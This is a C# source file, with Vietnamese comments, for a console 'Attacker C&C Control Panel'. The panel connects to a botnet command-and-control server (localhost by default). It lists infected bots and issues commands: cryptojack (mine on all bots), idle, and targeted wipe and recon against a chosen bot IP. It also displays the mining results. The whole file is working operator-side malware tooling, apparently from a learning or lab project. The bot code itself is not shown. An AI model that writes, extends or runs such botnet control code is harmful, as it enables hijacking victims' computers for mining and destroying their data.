using System;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading.Tasks;
using System.Collections.Generic;

// =======================================================
// === BẢNG ĐIỀU KHIỂN CỦA ATTACKER (UPDATED)          ===
// =======================================================

public class BotInfo
{
    [JsonPropertyName("botIp")]
    public string BotIp { get; set; } // Đây là IP của Bot

    [JsonPropertyName("lastSeen")]
    public DateTime LastSeen { get; set; }

    [JsonPropertyName("status")]
    public string Status { get; set; }
}

public class CryptoJackResult
{
    [JsonPropertyName("botIp")]
    public string BotIp { get; set; }

    [JsonPropertyName("nonce")]
    public long Nonce { get; set; }

    [JsonPropertyName("hash")]
    public string Hash { get; set; }

    [JsonPropertyName("timestamp")]
    public DateTime Timestamp { get; set; }
}

public class AttackerControlPanel
{
    // !!! QUAN TRỌNG: Nếu chạy Panel cùng máy với Server thì để 127.0.0.1
    // Nếu chạy khác máy thì điền IP của máy Server.
    private static readonly string CncServerIp = "127.0.0.1";
    private static readonly string CncServerUrl = $"http://{CncServerIp}:8000";

    private static readonly HttpClient client = new HttpClient();

    private static readonly JsonSerializerOptions _jsonOptions = new JsonSerializerOptions
    {
        PropertyNameCaseInsensitive = true // Bỏ qua lỗi chữ hoa/thường
    };

    static async Task Main(string[] args)
    {
        Console.Title = "Attacker C&C Control Panel";

        while (true)
        {
            ShowHeader();
            ShowMenu();

            Console.Write("Enter your choice: ");
            string choice = Console.ReadLine();

            Console.Clear();
            ShowHeader();

            bool shouldExit = await ProcessChoice(choice);
            if (shouldExit)
            {
                break;
            }

            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("\nPress any key to return to the menu...");
            Console.ReadKey();
        }

        Console.WriteLine("Control panel shutting down.");
    }

    static void ShowHeader()
    {
        Console.Clear();
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("ATTACKER COMMAND & CONTROL (C&C) PANEL");
        Console.WriteLine($"Server Target: {CncServerUrl}");
        Console.ResetColor();
        Console.WriteLine();
    }

    static void ShowMenu()
    {
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("--- Global Commands (Apply to ALL) ---");
        Console.ResetColor();
        Console.WriteLine(" [1] Command: CRYPTOJACK (Start mining all)");
        Console.WriteLine(" [2] Command: IDLE (Stop all tasks)");

        // === THÊM LỆNH WIPE VÀ RECON ===
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("\n--- Targeted Commands (Specific Bot) ---");
        Console.WriteLine(" [3] Command: WIPE (Select a target)");
        Console.WriteLine(" [4] Command: RECON (Select a target)");
        Console.ResetColor();

        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("\n--- Monitoring ---");
        Console.ResetColor();
        Console.WriteLine(" [5] List all active Bots");

        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("\n--- System ---");
        Console.ResetColor();
        Console.WriteLine(" [6] Refresh Menu");
        Console.WriteLine(" [0] Exit Panel");
        Console.WriteLine();
    }

    static async Task<bool> ProcessChoice(string choice)
    {
        switch (choice)
        {
            case "1":
                await SendCommandToServer("cryptojack", "ALL");
                break;
            case "2":
                await SendCommandToServer("idle", "ALL");
                break;
            case "3":
                await HandleTargetedCommand("wipe");
                break;
            case "4":
                await HandleTargetedCommand("recon");
                break;
            case "5":
                await ListBots();
                break;
            case "6":
                // Refresh (không làm gì cả, vòng lặp sẽ tự vẽ lại menu)
                return false;
            case "0":
                return true; // Thoát
            default:
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid choice.");
                Console.ResetColor();
                break;
        }
        return false;
    }
    // Hàm mới để xử lý việc chọn Bot
    static async Task HandleTargetedCommand(string command)
    {
        Console.WriteLine("Fetching bot list for target selection...");
        try
        {
            string jsonResponse = await client.GetStringAsync($"{CncServerUrl}/bot/list");
            var bots = JsonSerializer.Deserialize<List<BotInfo>>(jsonResponse, _jsonOptions);

            if (bots == null || bots.Count == 0)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("No bots available to target.");
                Console.ResetColor();
                return;
            }

            Console.WriteLine($"\nSelect a bot to {command.ToUpper()}:");
            Console.WriteLine(" [0] CANCEL");

            for (int i = 0; i < bots.Count; i++)
            {
                var bot = bots[i];
                var statusColor = bot.Status == "WIPING" ? ConsoleColor.Red : ConsoleColor.Green;
                Console.Write($" [{i + 1}] {bot.BotIp} ");
                Console.ForegroundColor = statusColor;
                Console.WriteLine($"({bot.Status})");
                Console.ResetColor();
            }

            Console.Write("Your choice: ");
            string input = Console.ReadLine()?.Trim().ToUpper();

            if (input == "0") return;

            //string targetIp = "";

            //if (input == "A")
            //{
            //    if (command == "wipe")
            //    {
            //        Console.ForegroundColor = ConsoleColor.Red;
            //        Console.Write("WARNING: You are about to WIPE ALL BOTS. Confirm? (y/n): ");
            //        if (Console.ReadLine()?.ToLower() != "y") return;
            //    }
            //    targetIp = "ALL";
            //}
            //else if (int.TryParse(input, out int index) && index > 0 && index <= bots.Count)
            //{
            //    targetIp = bots[index - 1].BotIp;
            //}
            //else
            //{
            //    Console.WriteLine("Invalid selection.");
            //    return;
            //}

            //if (command == "wipe" && targetIp != "ALL")
            //{
            //    Console.ForegroundColor = ConsoleColor.Red;
            //    Console.Write($"Confirm WIPE on target {targetIp}? (y/n): ");
            //    Console.ResetColor();
            //    if (Console.ReadLine()?.ToLower() != "y") return;
            //}
            if (!int.TryParse(input, out int index) || index < 1 || index > bots.Count)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid selection. Must choose a number from the list.");
                Console.ResetColor();
                return;
            }
            string targetIp = bots[index - 1].BotIp;
            if (command == "wipe")
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write($"⚠ WARNING: Confirm WIPE on target {targetIp}? (y/n): ");
                Console.ResetColor();
                if (Console.ReadLine()?.ToLower() != "y")
                {
                    Console.WriteLine("Operation cancelled.");
                    return;
                }
            }

            await SendCommandToServer(command, targetIp);
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"Error fetching bot list: {ex.Message}");
            Console.ResetColor();
        }
    }


    static async Task SendCommandToServer(string command, string targetIp)
    {
        string targetDisplay = targetIp == "ALL" ? "ALL BOTS" : targetIp;
        Console.WriteLine($"Issuing command '{command}' to {targetDisplay}...");
        try
        {
            var payload = new { Command = command, TargetBotIp = targetIp };
            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
            HttpResponseMessage response = await client.PostAsync($"{CncServerUrl}/bot/setcommand", content);

            if (response.IsSuccessStatusCode)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"SUCCESS: Command '{command}' set for {targetDisplay}.");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"FAILED: Server returned status {response.StatusCode}.");
            }
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"ERROR: Could not connect to the server. Is C&CServer.exe running?");
            Console.WriteLine($"Details: {ex.Message}");
        }
        finally
        {
            Console.ResetColor();
        }
    }

    static async Task ListBots()
    {
        Console.WriteLine("Fetching bot list from server...");
        try
        {
            string jsonResponse = await client.GetStringAsync($"{CncServerUrl}/bot/list");
            //var bots = JsonSerializer.Deserialize<List<BotInfo>>(jsonResponse);
            var bots = JsonSerializer.Deserialize<List<BotInfo>>(jsonResponse, _jsonOptions);

            if (bots == null || bots.Count == 0)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("No bots have checked in yet.");
                Console.ResetColor();
                return;
            }

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine($"\n--- Found {bots.Count} Bot(s) ---");
            // Cập nhật tiêu đề cột cho đúng với logic IP
            Console.WriteLine($"{"Bot IP / ID",-38}{"Last Seen (UTC)",-25}{"Status"}");
            Console.WriteLine(new string('-', 80));
            Console.ResetColor();

            foreach (var bot in bots)
            {
                var timeAgo = DateTime.UtcNow - bot.LastSeen;
                Console.WriteLine($"{bot.BotIp,-38}{bot.LastSeen,-25:yyyy-MM-dd HH:mm:ss}{bot.Status} ({(int)timeAgo.TotalSeconds}s ago)");
            }
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"ERROR: Could not fetch bot list. Is C&CServer.exe running?");
            Console.ResetColor();
        }
    }

    static async Task ViewResults()
    {
        Console.WriteLine("Fetching results from server...");
        try
        {
            string jsonResponse = await client.GetStringAsync($"{CncServerUrl}/bot/results");
            var results = JsonSerializer.Deserialize<List<CryptoJackResult>>(jsonResponse, _jsonOptions);

            if (results == null || results.Count == 0)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("No results have been submitted yet.");
                Console.ResetColor();
                return;
            }

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine($"\n--- Found {results.Count} Result(s) ---");
            Console.WriteLine($"{"Timestamp (UTC)",-25}{"Bot IP / ID",-38}{"Nonce",-12}{"Hash"}");
            Console.WriteLine(new string('-', 120));
            Console.ResetColor();

            foreach (var result in results)
            {
                Console.WriteLine($"{result.Timestamp,-25:yyyy-MM-dd HH:mm:ss}{result.BotIp,-38}{result.Nonce,-12}{result.Hash.Substring(0, 16)}...");
            }
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"ERROR: Could not fetch results. Is C&CServer.exe running?");
            Console.ResetColor();
        }
    }
}